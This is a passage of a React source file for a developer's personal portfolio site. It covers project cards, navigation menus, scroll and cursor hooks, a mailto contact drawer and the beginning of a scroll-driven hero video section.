import { useState, useEffect, useRef } from "react";
import { BrowserRouter as Router, Routes, Route, Link, useLocation } from "react-router-dom";
import BlogList from "./blog/BlogList";
import BlogPost from "./blog/BlogPost";
import CaseStudyPost from "./blog/CaseStudyPost";
import BLOG_POSTS from "./blog/blogData";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const aqibPhoto = "/MY%20pfp.png";

// â”€â”€â”€ DATA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const ROLES = [
  "Code.",
  "AI.",
  "Automation."
];
// Each card shows `image` at rest and swaps to `video` on hover. Both files
// live in /public. `href` is where the card links to.
const PROJECTS = [
  {
    id: "01",
    title: "SOCAN",
    category: "Music",
    type: "Non-Profit Website",
    image: "/socan.webp",
    video: "/socan.mp4",
    href: "https://www.socan.com/",
  },
  {
    id: "02",
    title: "VALIDSOFT",
    category: "Marketing",
    type: "Website",
    image: "/validsoft-600x720.webp",
    video: "/validsoft.mp4",
    href: "https://www.validsoft.com/",
  },
  {
    id: "03",
    title: "UNILOCK",
    category: "Construction",
    type: "Product website",
    image: "/unilock_3.webp",
    video: "/unilock_4.mp4",
    href: "https://unilock.com/",
  },
  {
    id: "04",
    title: "FRANCHISE BOSTON",
    category: "Restaurant",
    type: "Microsite",
    image: "/franchise-boston.webp",
    video: "/franchise-boston.mp4",
    href: "https://www.ownabostons.com/",
  },
  {
    id: "05",
    title: "BASE1",
    category: "Marketing",
    type: "Website",
    image: "/baseone-prev-img-1.webp",
    video: "/base1.mp4",
    href: "https://baseone.uk/",
  },
  {
    id: "06",
    title: "STEELFIRE",
    category: "Industrial & Manufacturing",
    type: "Product website",
    image: "/steelfire.webp",
    video: "/steelfire.mp4",
    href: "https://www.steelfire.com/",
  },
];

const STATS = [
  { val: "50+", label: "Projects" }, { val: "2+yr", label: "Experience" },
  { val: "3", label: "Continents" }, { val: "100%", label: "Remote" },
];

const TECHNOLOGY_MENU = {
    title: "Technologies",
    layout: [
      [
        { heading: "Technology Stack", items: ["Simple", "Middle", "Enterprise"] },
        { heading: "Backend", items: ["Python", "Node", "Laravel", "PHP"], pill: "6+ technologies" },
      ],
      [
        { heading: "Digital Design", items: ["Figma", "Photoshop", "Illustrator", "Framer"] },
        { heading: "DevOps", items: ["AWS", "Firebase", "GCP", "Azure"], pill: "6+ technologies" },
      ],
      [
        { heading: "Frontend", items: ["React", "Angular", "Vue.js", "Flutter"], pill: "6+ technologies" },
        { heading: "Database", items: [] },
        { heading: "Cloud", items: [] },
        { heading: "Mobile Apps", items: [] },
      ],
    ].map(col => col.map(block => ({ ...block, items: block.items.map(label => ({ label, href: "#our-technologies" })) }))),
};

// â”€â”€â”€ HOOKS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function useTypewriter(words) {
  const [text, setText] = useState("");
  const [wi, setWi] = useState(0);
  const [ci, setCi] = useState(0);
  const [del, setDel] = useState(false);
  useEffect(() => {
    const w = words[wi];
    const isFinished = !del && ci === w.length;
    const delay = isFinished ? 1600 : del ? 42 : 88;
    const t = setTimeout(() => {
      if (!del) {
        if (ci < w.length) { setText(w.slice(0, ci + 1)); setCi(c => c + 1); }
        else setDel(true);
      } else if (ci > 0) {
        setText(w.slice(0, ci - 1)); setCi(c => c - 1);
      } else {
        setDel(false); setWi(i => (i + 1) % words.length);
      }
    }, delay);
    return () => clearTimeout(t);
  }, [ci, del, wi, words]);
  return text;
}

function useInView(threshold = 0.1) {
  const ref = useRef(null);
  const [inView, setInView] = useState(false);
  useEffect(() => {
    const obs = new IntersectionObserver(
      ([e]) => { if (e.isIntersecting) setInView(true); },
      { threshold }
    );
    if (ref.current) obs.observe(ref.current);
    return () => obs.disconnect();
  }, [threshold]);
  return [ref, inView];
}

function useMouse() {
  const [pos, setPos] = useState({ x: -300, y: -300 });
  useEffect(() => {
    const h = e => setPos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", h);
    return () => window.removeEventListener("mousemove", h);
  }, []);
  return pos;
}

// One state update per animation frame â€” raw scroll events fire far more often
// than the screen repaints, and re-rendering on every one of them is what makes
// scroll-linked animation stutter.
function useScrollY() {
  const [y, setY] = useState(0);
  useEffect(() => {
    let raf = 0;
    const h = () => {
      if (raf) return;
      raf = requestAnimationFrame(() => { raf = 0; setY(window.scrollY); });
    };
    window.addEventListener("scroll", h, { passive: true });
    return () => { window.removeEventListener("scroll", h); cancelAnimationFrame(raf); };
  }, []);
  return y;
}

function useIsMobile() {
  const [m, setM] = useState(false);
  useEffect(() => {
    const check = () => setM(window.innerWidth < 768);
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  return m;
}

// â”€â”€â”€ CURSOR â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Cursor({ pos, isMobile }) {
  const [trail, setTrail] = useState({ x: pos.x, y: pos.y });
  useEffect(() => {
    let raf;
    const lerp = () => {
      setTrail(t => ({ x: t.x + (pos.x - t.x) * 0.1, y: t.y + (pos.y - t.y) * 0.1 }));
      raf = requestAnimationFrame(lerp);
    };
    raf = requestAnimationFrame(lerp);
    return () => cancelAnimationFrame(raf);
  }, [pos]);

  if (isMobile) return null;
  return (
    <>
      <div style={{
        position: "fixed", left: pos.x - 4, top: pos.y - 4,
        width: 8, height: 8, borderRadius: "50%",
        background: "#eef2f6", pointerEvents: "none", zIndex: 9999,
      }} />
      <div style={{
        position: "fixed", left: trail.x - 20, top: trail.y - 20,
        width: 40, height: 40, borderRadius: "50%",
        border: "1px solid rgba(255,255,255,0.35)",
        pointerEvents: "none", zIndex: 9998,
      }} />
    </>
  );
}

// â”€â”€â”€ FLOATING CONTACT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function ContactDrawer({ side, onClose }) {
  const [form, setForm] = useState({ name: "", phone: "", email: "", message: "" });

  const submit = e => {
    e.preventDefault();
    const subject = encodeURIComponent(`New project inquiry from ${form.name || "website visitor"}`);
    const body = encodeURIComponent(
      `Name: ${form.name}\nPhone: ${form.phone}\nEmail: ${form.email}\n\nMessage:\n${form.message}`
    );
    window.location.href = `mailto:Aqibfahraz@gmail.com?subject=${subject}&body=${body}`;
  };

  const fieldStyle = {
    width: "100%", border: 0, borderBottom: "1px solid rgba(2,6,10,0.35)",
    padding: "12px 0 10px", outline: "none", background: "transparent",
    color: "#747474", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: "clamp(22px,2.2vw,32px)",
  };

  return (
    <div role="dialog" aria-modal="true" aria-label="Contact form" style={{ position: "fixed", inset: 0, zIndex: 1000 }}>
      <button aria-label="Close contact form" onClick={onClose} style={{
        position: "absolute", inset: 0, width: "100%", height: "100%", border: 0,
        background: "rgba(2,6,10,0.56)", backdropFilter: "blur(12px)", cursor: "pointer",
      }} />
      <form onSubmit={submit} style={{
        position: "absolute", top: 0, bottom: 0, [side]: 0,
        width: "min(68vw, 1050px)", maxWidth: "100%", height: "100dvh", overflow: "hidden",
        boxSizing: "border-box", background: "#f5f5f3", color: "#02060a", padding: "clamp(20px,3.2vw,46px) clamp(24px,6vw,110px)",
        boxShadow: "0 0 80px rgba(0,0,0,0.28)", animation: `${side === "right" ? "drawerRight" : "drawerLeft"} 0.45s cubic-bezier(.22,1,.36,1) both`,
      }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "clamp(18px,3.5vw,42px)" }}>
          <div style={{ fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: "clamp(21px,2.3vw,32px)", lineHeight: 1.05, letterSpacing: "-0.04em" }}>
            START SIMPLE -<br />JUST WRITE TO US
          </div>
          <button type="button" onClick={onClose} style={{ border: 0, background: "none", fontFamily: "'Space Mono',monospace", fontSize: 12, cursor: "pointer", color: "#02060a" }}>
            CLOSE <span style={{ fontSize: 20, verticalAlign: "-2px" }}>x</span>
          </button>
        </div>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Name)
          <input required value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} style={fieldStyle} autoFocus />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Phone)*
          <input required value={form.phone} onChange={e => setForm({ ...form, phone: e.target.value })} style={fieldStyle} inputMode="tel" />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14, marginBottom: "clamp(10px,1.5vw,18px)" }}>
          (Email)
          <input required type="email" value={form.email} onChange={e => setForm({ ...form, email: e.target.value })} style={fieldStyle} />
        </label>
        <label style={{ display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14 }}>
          (Your Message)
          <textarea required value={form.message} onChange={e => setForm({ ...form, message: e.target.value })} style={{ ...fieldStyle, minHeight: "clamp(58px,8vh,96px)", resize: "none" }} />
        </label>
        <div style={{ display: "flex", alignItems: "center", gap: 10, marginTop: "clamp(14px,2.5vh,28px)" }}>
          <button type="submit" style={{ border: 0, borderRadius: 999, background: "#02060a", color: "#fff", padding: "17px 34px", fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 16, fontWeight: 700, cursor: "pointer" }}>SEND MESSAGE</button>
          <button type="button" onClick={onClose} aria-label="Close contact form" style={{ width: 52, height: 52, border: 0, borderRadius: "50%", background: "#02060a", color: "#fff", fontSize: 26, cursor: "pointer" }}>x</button>
        </div>
      </form>
    </div>
  );
}

function FloatingContact({ onOpenContact }) {
  const btnStyle = {
    display: "flex", alignItems: "center", justifyContent: "center",
    width: "clamp(44px,6vw,52px)", height: "clamp(44px,6vw,52px)",
    borderRadius: "50%", background: "#eef2f6",
    border: "1px solid rgba(255,255,255,0.14)", color: "#02060a",
    textDecoration: "none", transition: "all 0.25s ease",
  };
  return (
    <div style={{
      position: "fixed", right: "clamp(16px,3vw,28px)", bottom: "clamp(16px,3vw,28px)",
      zIndex: 400, display: "flex", flexDirection: "column", gap: 12,
    }}>
      <button type="button" aria-label="Start a conversation" style={{ ...btnStyle, border: btnStyle.border, cursor: "pointer" }} onClick={() => onOpenContact("right")}
        onMouseEnter={e => { e.currentTarget.style.background = "#12161a"; e.currentTarget.style.color = "#eef2f6"; }}
        onMouseLeave={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
      >
        <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8">
          <path d="M12 2C6.48 2 2 5.94 2 10.8c0 2.78 1.47 5.26 3.76 6.87-.13 1.13-.5 2.5-1.23 3.86 1.61-.29 3.16-.98 4.34-1.85 1.01.28 2.08.42 3.13.42 5.52 0 10-3.94 10-8.8S17.52 2 12 2z" strokeLinejoin="round" />
          <circle cx="8" cy="10.8" r="1" fill="currentColor" stroke="none" />
          <circle cx="12" cy="10.8" r="1" fill="currentColor" stroke="none" />
          <circle cx="16" cy="10.8" r="1" fill="currentColor" stroke="none" />
        </svg>
      </button>
      <button type="button" aria-label="Email Aqib Faraz" style={{ ...btnStyle, border: btnStyle.border, cursor: "pointer" }} onClick={() => onOpenContact("right")}
        onMouseEnter={e => { e.currentTarget.style.background = "#12161a"; e.currentTarget.style.color = "#eef2f6"; }}
        onMouseLeave={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
      >
        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.57 3.58.57a1 1 0 011 1V20a1 1 0 01-1 1C10.61 21 3 13.39 3 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.2 2.46.57 3.58a1 1 0 01-.25 1.01l-2.2 2.2z" />
        </svg>
      </button>
    </div>
  );
}

// â”€â”€â”€ NAV DROPDOWN â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Reusable mega-menu: [title + description | divider | N-column grid | dark
// featured-project panel]. Same shell for Work/Stack/Blog â€” only `menu` differs.
function NavDropdown({ menu }) {
  const [show, setShow] = useState(false);
  useEffect(() => {
    const raf = requestAnimationFrame(() => setShow(true));
    return () => cancelAnimationFrame(raf);
  }, []);

  return (
    <div style={{
      position: "fixed", top: 64, left: 0, right: 0, zIndex: 501,
      padding: "0 clamp(20px,5vw,60px) 20px", pointerEvents: "none",
    }}>
      <div style={{
        background: "#fff", borderRadius: 10, overflow: "hidden",
        display: "flex", boxShadow: "0 30px 70px rgba(0,0,0,0.5)",
        maxWidth: 1240, margin: "0 auto", pointerEvents: "auto",
        opacity: show ? 1 : 0, transform: show ? "translateY(0)" : "translateY(-10px)",
        transition: "opacity 0.3s ease, transform 0.3s ease",
      }}>
        {/* Sidebar */}
        <div style={{
          width: "clamp(200px,18vw,260px)", flexShrink: 0,
          padding: "clamp(28px,3.5vw,44px) clamp(20px,2.5vw,32px)",
          display: "flex", flexDirection: "column", justifyContent: "space-between",
          minHeight: 340,
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 400,
            fontSize: "clamp(22px,2.4vw,28px)", letterSpacing: "0.02em",
            textTransform: "uppercase", color: "#02060a",
          }}>{menu.title}</div>
          <p style={{
            margin: 0, fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
            lineHeight: 1.55, color: "rgba(2,6,10,0.6)", maxWidth: 190,
          }}>{menu.description}</p>
        </div>

        {/* Divider */}
        <div style={{ width: 1, background: "rgba(2,6,10,0.1)", margin: "32px 0", flexShrink: 0 }} />

        {/* Columns */}
        <div style={{
          flex: 1, padding: "clamp(28px,3.5vw,44px) clamp(24px,3vw,40px)",
          display: "grid", gridTemplateColumns: "repeat(3,minmax(140px,1fr))",
          gap: "36px 32px", alignContent: "start",
        }}>
          {/* menu.layout is column-major (each column stacks its own blocks);
             menu.columns is a flat list, one block per column â€” normalize both to the same shape */}
          {(menu.layout || menu.columns.map(col => [col])).map((column, ci) => (
            <div key={ci} style={{ display: "flex", flexDirection: "column", gap: 26 }}>
              {column.map((block, bi) => (
                <div key={bi}>
                  {block.items.length > 0 && block.heading && (
                    <a href={menu.title === "Services" ? "#services" : menu.title === "Technologies" ? "#our-technologies" : "#work-proud"} style={{
                      display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 11,
                      letterSpacing: "0.08em", textTransform: "uppercase",
                      color: "rgba(2,6,10,0.35)", marginBottom: 14, textDecoration: "none",
                      transition: "color 0.2s",
                    }}
                      onMouseEnter={e => e.currentTarget.style.color = "#02060a"}
                      onMouseLeave={e => e.currentTarget.style.color = "rgba(2,6,10,0.35)"}
                    >{block.heading}</a>
                  )}
                  {block.items.length === 0 ? (
                    <a href="#our-technologies" style={{
                      display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700,
                      fontSize: 16, letterSpacing: "0.01em", textTransform: "uppercase",
                      color: "#02060a", textDecoration: "none", transition: "opacity 0.2s",
                    }}
                      onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                      onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                    >{block.heading}</a>
                  ) : (
                    <>
                      <div style={{ display: "flex", flexDirection: "column", gap: 18 }}>
                        {block.items.map(it => (
                          <a key={it.label} href={it.href} style={{
                            display: "flex", alignItems: "flex-start", gap: 10,
                            paddingLeft: block.heading ? 0 : 15,
                            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 14,
                            fontWeight: 500, letterSpacing: "0.02em", textTransform: "uppercase",
                            color: "#02060a", textDecoration: "none", lineHeight: 1.3,
                            transition: "opacity 0.2s",
                          }}
                            onMouseEnter={e => e.currentTarget.style.opacity = "0.55"}
                            onMouseLeave={e => e.currentTarget.style.opacity = "1"}
                          >
                            {block.heading && (
                              <span style={{
                                width: 5, height: 5, borderRadius: "50%", marginTop: 6,
                                border: "1px solid rgba(2,6,10,0.4)", flexShrink: 0,
                              }} />
                            )}
                            {it.label}
                          </a>
                        ))}
                      </div>
                      {block.pill && (
                        <span style={{
                          display: "inline-block", marginTop: 14,
                          fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 11, fontWeight: 500,
                          color: "rgba(2,6,10,0.55)", background: "rgba(2,6,10,0.06)",
                          borderRadius: 999, padding: "5px 12px",
                        }}>{block.pill}</span>
                      )}
                    </>
                  )}
                </div>
              ))}
            </div>
          ))}
        </div>

        {/* Featured project panel */}
        <div style={{
          width: "clamp(200px,19vw,270px)", flexShrink: 0,
          background: "#333", padding: "clamp(20px,2.5vw,28px)",
          display: "flex", flexDirection: "column", gap: 16,
        }}>
          <div style={{
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontWeight: 700, fontSize: 15,
            letterSpacing: "0.02em", textTransform: "uppercase", color: "#eef2f6",
          }}>New Project</div>
          <div style={{
            aspectRatio: "1 / 1", borderRadius: 6, overflow: "hidden", background: "#1a1a1a",
          }}>
            <img src="/new%20projects.jpg" alt="Latest project preview" style={{
              width: "100%", height: "100%", objectFit: "cover", display: "block",
            }} />
          </div>
        </div>
      </div>
    </div>
  );
}

// â”€â”€â”€ NAV â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const NAV_LINKS = [
  { label: "Portfolio", href: "#work-proud" },
  { label: "Services", href: "#services" },
  { label: "Technologies", href: "#our-technologies" },
  { label: "FAQ", href: "#faq" },
];

function Nav({ scrollY, isMobile, onOpenContact }) {
  const [open, setOpen] = useState(false);
  const compactViewport = isMobile || (typeof window !== "undefined" && window.innerWidth <= 1024);
  const tabletViewport = !isMobile && compactViewport;
  const solid = scrollY > 50;

  const linkStyle = {
    display: "flex", alignItems: "center", gap: 4,
    fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13,
    fontWeight: 600, letterSpacing: "0.01em",
    color: "rgba(255,255,255,0.5)", textDecoration: "none",
    background: "none", border: "none", cursor: "pointer", padding: 0,
    transition: "color 0.2s",
  };

  return (
    <div>
      <nav style={{
        // At the top it's a plain full-width bar; once scrolled it lifts into a
        // floating rounded capsule inset from the edges.
        position: "fixed", zIndex: 500,
        top: solid ? "clamp(8px,1vw,16px)" : 0,
        left: solid ? "clamp(10px,1.6vw,28px)" : 0,
        right: solid ? "clamp(10px,1.6vw,28px)" : 0,
        height: 64, display: "flex", alignItems: "center",
        justifyContent: "space-between",
        padding: solid
          ? "0 clamp(16px,2.4vw,34px)"
          : "0 clamp(20px,5vw,60px)",
        // frosted glass rather than a solid fill
        background: solid ? "rgba(255,255,255,0.06)" : "transparent",
        backdropFilter: solid ? "blur(22px) saturate(160%)" : "none",
        WebkitBackdropFilter: solid ? "blur(22px) saturate(160%)" : "none",
        borderRadius: solid ? 999 : 0,
        border: solid ? "1px solid rgba(255,255,255,0.14)" : "1px solid transparent",
        boxShadow: solid ? "0 14px 40px rgba(0,0,0,0.35)" : "none",
        opacity: compactViewport && scrollY > 30 ? 0 : 1,
        pointerEvents: compactViewport && scrollY > 30 ? "none" : "auto",
        transition: "all 0.45s cubic-bezier(0.25,1,0.5,1)",
      }}>
        {/* Personal name lockup */}
        <a href="/" style={{
          display: "inline-block", textDecoration: "none", color: "#eef2f6",
          fontFamily: "'Plus Jakarta Sans',sans-serif", lineHeight: 1,
        }}>
          <span style={{
            display: "block", fontSize: 17, fontWeight: 800, letterSpacing: "-0.02em",
          }}>Aqib Faraz</span>
        </a>

        {!compactViewport && (
          <div style={{ display: "flex", gap: "clamp(14px,2.5vw,36px)", alignItems: "center" }}>
            {NAV_LINKS.map(({ label, href }) => {
              const style = {
                ...linkStyle,
                color: "rgba(255,255,255,0.5)",
              };
              return <a key={label} href={href} style={style}
                onMouseOver={e => e.currentTarget.style.color = "#eef2f6"}
                onMouseOut={e => e.currentTarget.style.color = "rgba(255,255,255,0.5)"}
              >{label}</a>;
            })}
            <a href="/blog" style={linkStyle}
              onMouseOver={e => e.currentTarget.style.color = "#eef2f6"}
              onMouseOut={e => e.currentTarget.style.color = "rgba(255,255,255,0.5)"}
            >Blog</a>
          </div>
        )}

        {!compactViewport && (
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <button type="button" onClick={() => onOpenContact("right")} style={{
              fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13,
              fontWeight: 700, letterSpacing: "0.01em",
              color: "#02060a", background: "#eef2f6", borderRadius: 999,
              padding: "10px 22px", border: 0, cursor: "pointer",
              transition: "opacity 0.2s",
            }}
              onMouseEnter={e => e.currentTarget.style.opacity = "0.8"}
              onMouseLeave={e => e.currentTarget.style.opacity = "1"}
            >Let's Talk</button>
            <a href="#become-client" aria-label="Go to contact" style={{
              display: "flex", alignItems: "center", justifyContent: "center",
              width: 36, height: 36, borderRadius: "50%",
              border: "1px solid rgba(255,255,255,0.22)", color: "#eef2f6", flexShrink: 0,
              transition: "all 0.25s ease",
            }}
              onMouseEnter={e => { e.currentTarget.style.background = "#eef2f6"; e.currentTarget.style.color = "#02060a"; }}
              onMouseLeave={e => { e.currentTarget.style.background = "transparent"; e.currentTarget.style.color = "#eef2f6"; }}
            >
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M19 12H5M11 6l-6 6 6 6" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </a>
          </div>
        )}

        {compactViewport && (
          <button type="button" onClick={() => setOpen(o => !o)} aria-label={open ? "Close menu" : "Open menu"} style={{
            width: 42, height: 38, display: "grid", placeItems: "center",
            padding: 0, border: 0, background: "transparent", color: "#eef2f6", cursor: "pointer",
          }}>
            <span style={{ display: "flex", flexDirection: "column", gap: 5 }}>
              <span style={{ width: 25, height: 1.5, background: "currentColor", transform: open ? "translateY(3.25px) rotate(45deg)" : "none", transition: "transform 0.25s ease" }} />
              <span style={{ width: 25, height: 1.5, background: "currentColor", transform: open ? "translateY(-3.25px) rotate(-45deg)" : "none", transition: "transform 0.25s ease" }} />
            </span>
          </button>
        )}

      </nav>

      {compactViewport && scrollY > 30 && <div style={{
        position: "fixed", zIndex: 700,
        left: tabletViewport ? 24 : "clamp(6px,1.5vw,16px)",
        right: tabletViewport ? 24 : "clamp(6px,1.5vw,16px)",
        bottom: tabletViewport ? 16 : 10,
        display: "flex", justifyContent: "center", gap: 16,
        padding: "7px 0", border: "1px solid rgba(255,255,255,0.12)",
        borderRadius: 999, background: "rgba(18,18,18,0.35)",
        backdropFilter: "blur(18px)", boxShadow: "0 -8px 24px rgba(0,0,0,.18)",
      }}>
        <button onClick={() => setOpen(o => !o)} aria-label="Toggle menu" style={{ width: 54, height: 38, border: 0, borderRadius: 999, background: "transparent", color: "#f3f3f3", display: "grid", placeItems: "center", cursor: "pointer" }}>
          <span style={{ display: "flex", flexDirection: "column", gap: 5 }}><span style={{ width: 22, height: 1.5, background: "currentColor", transform: open ? "translateY(3.25px) rotate(45deg)" : "none", transition: "transform 0.25s ease" }} /><span style={{ width: 22, height: 1.5, background: "currentColor", transform: open ? "translateY(-3.25px) rotate(-45deg)" : "none", transition: "transform 0.25s ease" }} /></span>
        </button>
        <a href="mailto:Aqibfahraz@gmail.com" aria-label="Email Aqib Faraz" style={{ width: 54, height: 38, borderRadius: 999, display: "grid", placeItems: "center", color: "#f3f3f3" }}><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8"><rect x="3" y="5" width="18" height="14" rx="2" /><path d="m4 7 8 6 8-6" /></svg></a>
      </div>}

      {compactViewport && open && (
        <div style={{
          position: "fixed", top: scrollY > 30 ? 18 : 70, left: "clamp(8px,3vw,24px)", right: "clamp(8px,3vw,24px)", bottom: scrollY > 30 ? 70 : 18, zIndex: 800,
          background: "#f5f5f3", borderRadius: 6,
          padding: "24px clamp(22px,6vw,44px) 26px",
          boxShadow: "0 20px 60px rgba(0,0,0,0.42)",
        }}>
          {NAV_LINKS.map(({ label, href }) => (
            <a key={label} href={href || "#contact"} onClick={() => setOpen(false)} style={{
              display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif",
              fontSize: 15, fontWeight: 600,
              color: "#111", textDecoration: "none",
              padding: "18px 0", borderBottom: "1px solid rgba(0,0,0,0.1)",
            }}>{label}</a>
          ))}
          <a href="/blog" onClick={() => setOpen(false)} style={{
            display: "block", fontFamily: "'Plus Jakarta Sans',sans-serif",
            fontSize: 15, fontWeight: 600,
            color: "#111", textDecoration: "none",
            padding: "18px 0", borderBottom: "1px solid rgba(0,0,0,0.1)",
          }}>Blog</a>
          <button type="button" onClick={() => onOpenContact("right")} style={{
            display: "inline-block", marginTop: 20,
            fontFamily: "'Plus Jakarta Sans',sans-serif", fontSize: 13, fontWeight: 700,
            color: "#fff", background: "#02060a", borderRadius: 999,
            padding: "12px 26px", border: 0, cursor: "pointer",
          }}>Let's Talk</button>
        </div>
      )}
    </div>
  );
}

// â”€â”€â”€ HERO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function Hero({ isMobile, scrollY }) {
  const typed = useTypewriter(ROLES);
  const [vis, setVis] = useState(false);
  const [videoHov, setVideoHov] = useState(false);
  const [videoMuted, setVideoMuted] = useState(true);
  const heroVideoRef = useRef(null);
  const [showProfilePhoto, setShowProfilePhoto] = useState(false);
  const [isNarrowDesktop, setIsNarrowDesktop] = useState(false);
  useEffect(() => {
    const check = () => {
      setShowProfilePhoto(window.innerWidth >= 1366);
      setIsNarrowDesktop(window.innerWidth < 1366);
    };
    check();
    window.addEventListener("resize", check);
    return () => window.removeEventListener("resize", check);
  }, []);
  // â”€â”€ Pinned scroll-scrub video â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  // The hero stays pinned (sticky) for GROW_LENGTH + HOLD_LENGTH px of
  // scrolling. During that stretch the page appears frozen:
  //   Â· first GROW_LENGTH px  â€” scroll drives the video from its small slot
  //                             up to fullscreen
  //   Â· next  HOLD_LENGTH px  â€” video sits fullscreen so it can actually be
  //                             watched before the page moves on
  // Past the pin, the hero unsticks and the next section scrolls up normally.
  // Scrolling back up runs it in reverse â€” everything is derived from scrollY
  // with no transition, so it tracks the scroll exactly.
  const GROW_LENGTH = 800, HOLD_LENGTH = 600;
  const PIN_LENGTH = GROW_LENGTH + HOLD_LENGTH;
  const progress = isMobile ? 0 : Math.min(Math.max(scrollY / GROW_LENGTH, 0), 1);
  const pinDone = scrollY > PIN_LENGTH;

  // Measure the resting slot once (and on resize) â€” never during scroll.
  const videoSlotRef = useRef(null);
  const [slot, setSlot] = useState(null);
  useEffect(() => {
    if (isMobile) return;
    const measure = () => {
      const el = videoSlotRef.current;
      if (!el) return;
      const r = el.getBoundingClientRect();
      // The hero is sticky, so the slot holds its viewport position for the
      // whole pin â€” no scroll offset to add there. Only once the pin is over
      // does the hero scroll away, so add that part back. (Measuring mid-pin
      // and adding scrollY was what pushed the video off its slot on resize.)
      const scrolledPastPin = Math.max(0, window.scrollY - PIN_LENGTH);
      setSlot({
        w: Math.round(r.width),
        h: Math.round(r.height),
        top: Math.round(r.top + scrolledPastPin),
        left: Math.round(r.left),
      });
    };
    measure();
    window.addEventListener("resize", measure);
    return () => window.removeEventListener("resize", measure);
  }, [isMobile]);

